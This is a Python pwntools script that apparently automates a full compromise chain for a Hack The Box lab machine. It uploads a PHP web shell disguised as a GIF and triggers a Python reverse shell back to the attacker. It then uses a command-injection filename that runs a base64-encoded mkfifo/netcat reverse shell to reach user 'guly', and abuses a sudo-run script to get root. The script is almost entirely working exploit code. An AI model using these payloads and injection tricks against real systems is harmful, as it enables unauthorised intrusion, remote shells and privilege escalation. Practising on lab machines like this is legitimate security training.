#!/usr/bin/env python3

from pwn import *
import requests,urllib3, argparse,subprocess, secrets
from base64 import b64encode
import netifaces as ni
urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=UserWarning, module="pwntools")

proxy = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

try:
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    log.info("Success!, You are connected the HTB VPN")
except ValueError:
    #log.info("Failure!, You are not connected to HTB VPN")
    log.failure("Failure!, You are not connected to HTB VPN")
    sys.exit(-2)


def exploit(RHOST,user):
    session = requests.session()
    upload_url = f"http://{RHOST}/upload.php"
    boundary = secrets.token_hex(16)
    header = {
        "Host": RHOST,
	    "User-Agent": 'Pwning the idiot',
	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	    "Accept-Language": "en-US,en;q=0.5",
	    "Accept-Encoding": "gzip, deflate",
	    "Referer": upload_url,
	    "Content-Type": f"multipart/form-data; boundary=---------------------------{boundary}",
	    "Content-Length": "367",
	    "Origin": f"http://{RHOST}",
	    "DNT": "1",
	    "Connection": "close",
	    "Upgrade-Insecure-Requests": "1"
    }

    data = f'''-----------------------------{boundary}\nContent-Disposition: form-data; name="myFile"; filename="checking.php.gif"\nContent-Type: image/gif\n\nGIF89a;\n<?php system($_REQUEST['cmd']); ?>\n-----------------------------{boundary}\nContent-Disposition: form-data; name="submit"\n\ngo!\n-----------------------------{boundary}--'''
    upload_post = session.post(upload_url, headers=header, data=data, verify=False, proxies=proxy)
    FILE_NAME = str(ip).replace('.', '_')
    FILE_URL = f"http://{RHOST}/uploads/{FILE_NAME}.php.gif"
    listener = listen(0)
    port = listener.lport
    #print(port)
    data2 = f"""?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    try:
        call_file = session.get(FILE_URL + data2, verify=False, timeout=2 ,proxies=proxy)
    except:
        log.failure("Unable to establish connection!")
    shell = listener.wait_for_connection()
    if user == 1:
        log.success("Got the Apache user!")
        shell.interactive()

    else:
        listener2 = listen(0)
        port2 = listener2.lport
        payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port2} >/tmp/f"
        payload_b64 = b64encode(payload.encode('utf-8'))
        payload_b64_final = payload_b64.decode('utf-8')
        gully_payload = f"""touch '/var/www/html/uploads/a;echo {payload_b64_final} | base64 -d | sh'"""
        shell.sendline(gully_payload.encode('utf-8'))
        shell2 = listener2.wait_for_connection()
        if user == 2:
            log.success("Got the user Guly")
            shell2.interactive()
        elif user == 3:
            shell2.sendline("sudo -u root /usr/local/sbin/changename.sh".encode('utf-8'))
            shell2.recvline()
            shell2.sendline("a bash".encode('utf-8'))
            shell2.recvline()
            shell2.sendline("c".encode('utf-8'))
            shell2.recvline()
            shell2.sendline("d".encode('utf-8'))
            shell2.recvline()
            shell2.sendline("d".encode('utf-8'))
            shell2.interactive()
        else:
            log.failure("You entered an invalid option!")
            sys.exit(-2)
            
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', "--RHOST", required=True,help="Enter the Target IP!")
    argv = parser.parse_args()
    RHOST = argv.RHOST
    RHOST = RHOST.strip()
    log.progress("Give me sometime to check the machine reachability!")
    response = subprocess.Popen(['ping', '-c', '3', RHOST], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = response.communicate()
    if "ttl=" in output.decode():
        log.info("Success!, The machine is up and running")
    else:
        log.failure("Failure!, The machine is down or unreachable!")
        sys.exit(-2)
    
    print('''
    1. Apache
    2. Guly
    3. Root
    ''')
    user = input("[+] Enter the user you want to pwn : ")
    user = int(user.strip())
    if user > 0 and user <= 3:
        exploit(RHOST,user)
    else:
        log.info("Invalid Options!")


if __name__ == "__main__":
    main()